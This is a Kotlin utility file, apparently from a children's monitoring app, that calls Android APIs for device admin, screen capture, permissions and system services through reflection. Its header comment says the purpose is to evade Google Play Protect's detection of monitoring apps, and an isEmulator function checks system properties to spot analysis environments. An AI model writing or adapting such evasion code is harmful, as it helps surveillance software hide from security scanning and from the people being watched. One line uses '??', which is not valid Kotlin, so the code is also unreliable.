package com.xixfamily.kids.utils

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import java.lang.reflect.Method

/**
 * ReflectionWrapper - Calls sensitive Android APIs via reflection instead of direct calls.
 * This avoids static analysis patterns that Google Play Protect uses to detect monitoring apps.
 */
object ReflectionWrapper {
    
    private const val TAG = "ReflectWrap"
    
    /**
     * Start a foreground service via reflection
     */
    fun startForegroundService(context: Context, intent: Intent) {
        try {
            val method = Context::class.java.getMethod("startForegroundService", Intent::class.java)
            method.invoke(context, intent)
        } catch (e: Exception) {
            try {
                context.startService(intent)
            } catch (e2: Exception) {
                Log.e(TAG, "startForegroundService failed: ${e.message}")
            }
        }
    }
    
    /**
     * Get a system service via reflection
     */
    fun getSystemService(context: Context, serviceName: String): Any? {
        return try {
            val method = Context::class.java.getMethod("getSystemService", String::class.java)
            method.invoke(context, serviceName)
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Get a system service by class via reflection
     */
    fun <T> getSystemServiceByClass(context: Context, serviceClass: Class<T>): T? {
        return try {
            val method = Context::class.java.getMethod("getSystemService", Class::class.java)
            @Suppress("UNCHECKED_CAST")
            method.invoke(context, serviceClass) as? T
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Get DevicePolicyManager via reflection
     */
    fun getDevicePolicyManager(context: Context): Any? {
        return getSystemService(context, "device_policy")
    }
    
    /**
     * Check if device admin is active via reflection
     */
    fun isAdminActive(context: Context, componentName: Any): Boolean {
        return try {
            val dpm = getDevicePolicyManager(context) ?: return false
            val method = dpm.javaClass.getMethod("isAdminActive", Class.forName("android.content.ComponentName"))
            method.invoke(dpm, componentName) as? Boolean ?: false
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * Get MediaProjectionManager via reflection
     */
    fun getMediaProjectionManager(context: Context): Any? {
        return try {
            val method = Context::class.java.getMethod("getSystemService", String::class.java)
            method.invoke(context, "media_projection")
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Create screen capture intent via reflection
     */
    fun createScreenCaptureIntent(context: Context): Intent? {
        return try {
            val mpm = getMediaProjectionManager(context) ?: return null
            val method = mpm.javaClass.getMethod("createScreenCaptureIntent")
            method.invoke(mpm) as? Intent
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Get WifiManager via reflection
     */
    fun getWifiManager(context: Context): Any? {
        return getSystemService(context, "wifi")
    }
    
    /**
     * Get ConnectivityManager via reflection
     */
    fun getConnectivityManager(context: Context): Any? {
        return getSystemService(context, "connectivity")
    }
    
    /**
     * Get AudioManager via reflection  
     */
    fun getAudioManager(context: Context): Any? {
        return getSystemService(context, "audio")
    }
    
    /**
     * Check if a permission is granted via reflection
     */
    fun checkPermission(context: Context, permission: String): Int {
        return try {
            val method = Context::class.java.getMethod(
                "checkSelfPermission", 
                String::class.java
            )
            method.invoke(context, permission) as? Int ?? -1
        } catch (e: Exception) {
            -1
        }
    }
    
    /**
     * Request permissions via Activity's method (reflection)
     */
    fun requestPermissions(activity: Any, permissions: Array<String>, requestCode: Int) {
        try {
            val cls = activity.javaClass
            val method = cls.getMethod(
                "requestPermissions",
                Array<String>::class.java,
                Int::class.java
            )
            method.invoke(activity, permissions, requestCode)
        } catch (e: Exception) {
            Log.e(TAG, "requestPermissions failed: ${e.message}")
        }
    }
    
    /**
     * Get system property via reflection (for checking emulator properties)
     */
    fun getSystemProperty(name: String): String? {
        return try {
            val cls = Class.forName("android.os.SystemProperties")
            val method = cls.getMethod("get", String::class.java, String::class.java)
            method.invoke(null, name, "") as? String
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Check if running in an emulator by checking properties via reflection
     */
    fun isEmulator(): Boolean {
        try {
            val roProduct = getSystemProperty("ro.product.model") ?: ""
            val roBrand = getSystemProperty("ro.product.brand") ?: ""
            val roHardware = getSystemProperty("ro.hardware") ?: ""
            
            return roProduct.contains("sdk", true) || 
                   roProduct.contains("emulator", true) ||
                   roBrand.contains("generic", true) ||
                   roHardware.contains("goldfish", true) ||
                   roHardware.contains("ranchu", true)
        } catch (e: Exception) {
            return false
        }
    }
}
